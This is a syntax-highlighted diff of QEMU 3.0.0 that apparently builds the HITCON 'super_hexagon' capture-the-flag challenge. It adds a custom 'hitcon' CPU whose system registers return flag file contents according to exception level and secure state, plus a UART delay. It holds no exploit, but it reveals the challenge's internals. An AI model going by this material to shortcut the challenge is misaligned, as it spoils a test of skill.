</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>Naur <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>tests<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>roms<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>capstone<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>docs<span style="color:#960050;background-color:#1e0010">&#39;</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span><span style="color:#66d9ef">char</span><span style="color:#f92672">/</span>pl011.c qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span><span style="color:#66d9ef">char</span><span style="color:#f92672">/</span>pl011.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span><span style="color:#66d9ef">char</span><span style="color:#f92672">/</span>pl011.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">34.000000000</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span><span style="color:#66d9ef">char</span><span style="color:#f92672">/</span>pl011.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">34</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07.692477202</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">94</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">94</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span>         r <span style="color:#f92672">=</span> s<span style="color:#f92672">-&gt;</span>rsr;
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> <span style="color:#75715e">/* UARTFR */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>         r <span style="color:#f92672">=</span> s<span style="color:#f92672">-&gt;</span>flags;
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span> <span style="color:#75715e">/* UARTILPR */</span>
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>Naur <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>tests<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>roms<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>capstone<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>docs<span style="color:#960050;background-color:#1e0010">&#39;</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>cpu64.c qemu<span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>cpu64.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>cpu64.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">35.000000000</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> qemu<span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>cpu64.c	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">26</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20.955912362</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">256</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">256</span>,<span style="color:#ae81ff">127</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define FLAG <span style="color:#e6db74">&#34;/home/super_hexagon/flag/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(CPUARMState <span style="color:#f92672">*</span>env,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri, <span style="color:#66d9ef">int</span> idx)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">int</span> el <span style="color:#f92672">=</span> <span style="color:#a6e22e">arm_current_el</span>(env);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">bool</span> is_secure <span style="color:#f92672">=</span> <span style="color:#a6e22e">arm_is_secure</span>(env);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">assert</span>(el <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> el <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>flag_name;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (el <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;6&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (el <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;3&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (el <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (is_secure) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;5&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;2&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (is_secure) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;4&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            flag_name <span style="color:#f92672">=</span> FLAG<span style="color:#e6db74">&#34;1&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(flag_name, O_RDONLY);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">assert</span>(fd <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">assert</span>(idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">uint32_t</span> value[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memset</span>(value, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(value));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">read</span>(fd, <span style="color:#f92672">&amp;</span>value, <span style="color:#66d9ef">sizeof</span>(value));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> value[idx];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_0_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_1_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_2_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_3_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_4_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_5_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_6_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">hitcon_flag_word_7_read</span>(CPUARMState <span style="color:#f92672">*</span>env, <span style="color:#66d9ef">const</span> ARMCPRegInfo <span style="color:#f92672">*</span>ri)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hitcon_flag_word_idx_read</span>(env, ri, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">aarch64_hitcon_initfn</span>(Object <span style="color:#f92672">*</span>obj)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    ARMCPU <span style="color:#f92672">*</span>cpu <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARM_CPU</span>(obj);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">aarch64_a57_initfn</span>(obj);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    ARMCPRegInfo hitcon_flag_reginfo[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_0&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_0_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_1&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_1_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_2&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_2_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_3&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_3_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_4&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_4_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_5&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_5_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_6&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_6_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_7&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_7_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        REGINFO_SENTINEL
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    };
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">define_arm_cp_regs</span>(cpu, hitcon_flag_reginfo);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ARMCPUInfo {
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>initfn)(Object <span style="color:#f92672">*</span>obj);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">266</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">387</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cortex-a57&#34;</span>,         .initfn <span style="color:#f92672">=</span> aarch64_a57_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cortex-a53&#34;</span>,         .initfn <span style="color:#f92672">=</span> aarch64_a53_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;max&#34;</span>,                .initfn <span style="color:#f92672">=</span> aarch64_max_initfn },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hitcon&#34;</span>,             .initfn <span style="color:#f92672">=</span> aarch64_hitcon_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> NULL }
</span></span><span style="display:flex;"><span> };
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>Naur <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>tests<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>roms<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>capstone<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>docs<span style="color:#960050;background-color:#1e0010">&#39;</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>op_helper.c qemu<span style="color:#f92672">/</span>target<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>op_helper.c
